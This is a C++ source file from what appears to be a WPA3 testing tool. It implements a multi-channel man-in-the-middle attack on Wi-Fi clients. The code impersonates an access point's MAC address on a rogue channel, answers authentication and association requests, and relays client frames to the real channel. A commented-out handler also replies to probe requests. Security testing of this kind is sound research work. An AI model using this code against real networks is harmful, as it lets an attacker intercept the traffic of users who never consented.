#include "attacks/mc_mitm/mc_mitm.h"

#include <chrono>
#include <tins/tins.h>
#include "attacks/by_target/scan_AP.h"
#include "attacks/mc_mitm/wifi_util.h"
#include "logger/error_log.h"
#include "logger/log.h"
#include "system/hw_capabilities.h"

namespace wpa3_tester{
using namespace std;
using namespace chrono;
using namespace Tins;

void McMitm::handle_open_auth(const HWAddress<6> &addr2, const Dot11Authentication &auth) const{
    if(auth.auth_algorithm() != 0 || auth.auth_seq_number() != 1) return;

    Dot11Authentication resp;
    resp.addr1(addr2);
    resp.addr2(ap_mac);
    resp.addr3(ap_mac);
    resp.auth_seq_number(2);
    resp.auth_algorithm(0);
    resp.status_code(0);
    sock_rogue->send(resp, netconfig.rogue_channel);
    log(LogLevel::DEBUG, "Rogue channel: sent Open Auth response to {}", addr2.to_string());
}

void McMitm::handle_assoc_request(const HWAddress<6> &addr2, PDU &pdu, const Dot11AssocRequest &assoc) const{
    Dot11AssocResponse resp;
    resp.addr1(addr2);
    resp.addr2(ap_mac);
    resp.addr3(ap_mac);
    resp.status_code(0);
    resp.capabilities() = assoc.capabilities();
    resp.aid(1);
    resp.supported_rates({82, 84, 139, 150, 36, 48, 72, 96});
    sock_rogue->send(resp, netconfig.rogue_channel);
    log(LogLevel::DEBUG, "Rogue channel: sent Assoc response to {}", addr2.to_string());

    // send assoc requesst to start EAPOL handshake
    sock_real->send(pdu, netconfig.real_channel);
}

void McMitm::handle_from_client_rogue(const unique_ptr<PDU> &pdu, Dot11 &dot11, const HWAddress<6> &addr2) {
    ClientState *client = nullptr;
    bool will_forward = false;

    if(clients.contains(addr2.to_string())){
        client = clients.at(addr2.to_string()).get();
        will_forward = client->should_forward(*pdu);
        if(dot11.find_pdu<Dot11Authentication>() || dot11.find_pdu<Dot11AssocRequest>() ||
           client->state <= ClientState::Connecting){
            print_rx(LogLevel::INFO, "Rogue channel", dot11, " -- MitM'ing");
            client->mark_got_mitm();
        } else{
            client->last_rogue = display_client_traffic(*pdu, "Rogue channel", client->last_rogue, " -- MitM'ing");
        }
    } else if(dot11.find_pdu<Dot11Authentication>() || dot11.find_pdu<Dot11AssocRequest>() ||
              dot11.type() == Dot11::DATA){
        print_rx(LogLevel::INFO, "Rogue channel", dot11, " -- MitM'ing");
        auto new_client = ClientState(addr2.to_string());
        new_client.mark_got_mitm();
        add_client(new_client);
        client = clients.at(addr2.to_string()).get();
        will_forward = true;
    } else if(addr2 == client_mac){
        last_print_rogue_chan = display_client_traffic(*pdu, "Rogue channel", last_print_rogue_chan);
    }

    if(client && will_forward){
        if(power_mgmt(dot11) && client->state < ClientState::Attack_Done)
            log(LogLevel::WARNING, "Client {} is going to sleep on rogue channel.", addr2.to_string());
        sock_real->send(*pdu, netconfig.real_channel);
    }
}

/*void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu){
    auto *dot11 = pdu->find_pdu<Dot11>();
    if(!dot11) return;

    HWAddress<6> addr2;
    if(const auto *mgmt = pdu->find_pdu<Dot11ManagementFrame>())
        addr2 = mgmt->addr2().to_string();
    else if(const auto *data = pdu->find_pdu<Dot11Data>())
        addr2 = data->addr2().to_string();

    if(const auto *auth = dot11->find_pdu<Dot11Authentication>()){
        handle_open_auth(addr2, *auth);
        return;
    }

    if(const auto *assoc = dot11->find_pdu<Dot11AssocRequest>()){
        handle_assoc_request(addr2, *pdu, *assoc);
        return;
    }

    if(addr2 == ap_mac){
        if(const auto *b = dot11->find_pdu<Dot11Beacon>()){
            const auto *ch_ie = b->search_option(Dot11ManagementFrame::DS_SET);
            if(ch_ie && ch_ie->data_size() >= 1 && ch_ie->data_ptr()[0] == netconfig.rogue_channel)
                last_rogue_beacon = steady_clock::now();
        }
        if(dot11->addr1() == client_mac)
            last_print_rogue_chan = display_client_traffic(*pdu, "Rogue channel", last_print_rogue_chan);
        else if(clients.contains(dot11->addr1().to_string()))
            clients.at(dot11->addr1().to_string())->last_rogue =
                display_client_traffic(*pdu, "Rogue channel", clients.at(dot11->addr1().to_string())->last_rogue);
    } else if(dot11->find_pdu<Dot11ProbeRequest>()){
        probe_resp->addr1(addr2);
        sock_rogue->send(*probe_resp, netconfig.rogue_channel);
        display_client_traffic(*pdu, "Rogue channel", last_print_rogue_chan, " -- Replied");
    } else if(dot11->addr1() == ap_mac){
        handle_from_client_rogue(pdu, *dot11, addr2);
    } else if(dot11->addr1() == client_mac || addr2 == client_mac){
        last_print_rogue_chan = display_client_traffic(*pdu, "Rogue channel", last_print_rogue_chan);
    }
}*/
}